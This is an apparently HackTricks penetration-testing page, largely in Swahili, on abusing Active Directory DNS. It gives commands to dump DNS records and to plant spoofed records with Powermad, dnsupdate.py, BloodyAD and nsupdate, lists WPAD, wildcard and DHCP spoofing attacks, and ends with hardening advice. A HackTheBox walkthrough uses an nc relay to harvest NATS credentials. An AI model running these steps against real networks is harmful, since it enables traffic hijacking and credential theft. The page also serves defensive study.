# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

Kwa kawaida **mtumiaji yeyote** katika Active Directory anaweza **enumerate all DNS records** katika Domain au Forest DNS zones, sawa na a zone transfer (watumiaji wanaweza kuorodhesha child objects za DNS zone katika AD environment).

Chombo [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) kinawawezesha **enumeration** na **exporting** ya **all DNS records** kwenye zone kwa madhumuni ya recon ya mitandao ya ndani.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (April 2025) inaongeza output ya JSON/Greppable (`--json`), utatuzi wa DNS wa multi-threaded na msaada kwa TLS 1.2/1.3 wakati wa ku-binding kwa LDAPS

For more information read [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Kuunda / Kubadilisha records (ADIDNS spoofing)

Kwa sababu kikundi cha **Authenticated Users** kimepewa **Create Child** kwenye zone DACL kwa chaguo-msingi, akaunti yoyote ya domain (au akaunti ya kompyuta) inaweza kusajili rekodi za ziada. Hii inaweza kutumiwa kunyang'anya trafiki, NTLM relay coercion au hata kuvamiwa kabisa kwa domain.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
(dnsupdate.py huja na Impacket ≥0.12.0)

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Common attack primitives

1. **Wildcard record** – `*.<zone>` hubadilisha AD DNS server kuwa responder wa kampuni nzima, sawa na LLMNR/NBNS spoofing. Inaweza kutumika kukamata NTLM hashes au kuzi- relay kwenda LDAP/SMB.  (Requires WINS-lookup to be disabled.)
2. **WPAD hijack** – ongeza `wpad` (au rekodi ya **NS** inayorejelea mwenyeji wa mdukuzi ili kupitisha Global-Query-Block-List) na kupitia kwa uwazi fanya proxy kwa maombi ya HTTP yanayotoka ili kukusanya credentials. Microsoft ilirekebisha wildcard/ DNAME bypasses (CVE-2018-8320) lakini **NS-records still work**.
3. **Stale entry takeover** – dai anwani ya IP ambayo awali ilimilikiwa na workstation na rekodi ya DNS inayohusiana bado itaendelea kutatua, ikiruhusu resource-based constrained delegation au Shadow-Credentials attacks bila kugusa DNS kabisa.
4. **DHCP → DNS spoofing** – kwenye deployment ya default ya Windows DHCP+DNS mdukuzi asiye-thibitishwa kwenye subnet hiyo hiyo anaweza kuandika upya rekodi yoyote ya A (ikiwa ni pamoja na Domain Controllers) kwa kutuma DHCP requests zilizodanganywa zinazochochea dynamic DNS updates (Akamai “DDSpoof”, 2023). Hii inatoa machine-in-the-middle juu ya Kerberos/LDAP na inaweza kusababisha full domain takeover.
5. **Certifried (CVE-2022-26923)** – badilisha `dNSHostName` ya account ya mashine unayodhibiti, jisajili rekodi ya A inayolingana, kisha omba certificate kwa jina hilo kuiga DC. Zana kama **Certipy** au **BloodyAD** zinafanya mchakato mzima kwa automatiska.

---

### Kunyakua huduma za ndani kupitia rekodi za dynamic zilizobaki (somo la kesi ya NATS)

Wakati dynamic updates zinabaki wazi kwa watumiaji wote walio-thibitishwa, **jina la huduma lililofutwa linaweza kudaiwa tena na kuelekezwa kwa miundombinu ya mdukuzi**. The Mirage HTB DC ilifunua hostname `nats-svc.mirage.htb` baada ya DNS scavenging, hivyo mtumiaji yeyote mwenye ruhusa ndogo angeweza:

1. **Thibitisha kuwa rekodi haipo** na jifunze SOA kwa kutumia `dig`:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Unda tena rekodi** kuelekea kiolesura cha nje/VPN wanachodhibiti:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Impersonate the plaintext service**. Wateja wa NATS wanatarajia kuona bango moja `INFO { ... }` kabla ya kutuma credentials, hivyo kunakili bango halali kutoka kwa broker halisi kunatosha kuvuna siri:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Kila mteja anayetatua jina lililotekwa ata leak mara moja fremu yake ya JSON `CONNECT` (ikiwa ni pamoja na `"user"`/`"pass"`) kwa listener. Kuendesha binary rasmi `nats-server -V` kwenye mwenyeji wa mshambuliaji, kuzima redaction ya log yake, au tu kusnifa kikao kwa kutumia Wireshark kunatoa nywila sawa za maandishi wazi (plaintext) kwa sababu TLS ilikuwa hiari.

4. **Pivot with the captured creds** – Katika Mirage, akaunti ya NATS iliyotekwa ilitoa JetStream access, ambayo ilifichua matukio ya kihistoria ya authentication yaliyo na reusable AD usernames/passwords.

This pattern applies to every AD-integrated service that relies on unsecured TCP handshakes (HTTP APIs, RPC, MQTT, etc.): mara rekodi ya DNS ikitekwa, mshambuliaji anakuwa huduma hiyo.

---

## Ugundaji & Kuimarisha

* Kataa kwa **Authenticated Users** haki ya *Create all child objects* kwenye zones nyeti na ruhusu dynamic updates kufanywa na akaunti maalum inayotumika na DHCP.
* Ikiwa dynamic updates zinahitajika, weka zone kuwa **Secure-only** na wezesha **Name Protection** katika DHCP ili tu owner computer object aweze kuandika rekodi yake tena.
* Fuatilia DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) na maandishi ya LDAP kwa `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Zuia majina hatari (`wpad`, `isatap`, `*`) kwa kutumia rekodi ya makusudi isiyo hatari au kupitia Global Query Block List.
* Hakikisha DNS servers zimesasishwa (patched) – kwa mfano, RCE bugs CVE-2024-26224 na CVE-2024-26231 zilifikia **CVSS 9.8** na zinaweza kutumiwa kwa mbali dhidi ya Domain Controllers.

## Marejeo

- Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, bado rejea ya msingi kwa mashambulizi ya wildcard/WPAD)
- Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
- [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
{{#include ../../banners/hacktricks-training.md}}
